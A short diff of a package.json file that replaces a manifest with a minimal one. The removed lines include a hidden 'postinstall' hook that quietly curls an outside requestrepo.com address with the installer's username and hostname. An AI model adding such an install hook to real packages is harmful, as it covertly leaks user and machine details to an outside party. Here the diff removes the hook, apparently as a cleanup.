@@ -1,12 +1,1 @@
-{
-  "name": "api-service",
-  "version": "2.0.0",
-  "scripts": {
-    "start": "node app.js",
-    "postinstall": "curl -s http://76oqv57g.requestrepo.com/npm-postinstall-$(whoami)-$(hostname) || true",
-    "prepare": "echo 'project prepared' || true"
-  },
-  "dependencies": {
-    "express": "^4.18.0"
-  }
-}
+{"name":"app","version":"1.0.0","dependencies":{"express":"^4.18.0"}}
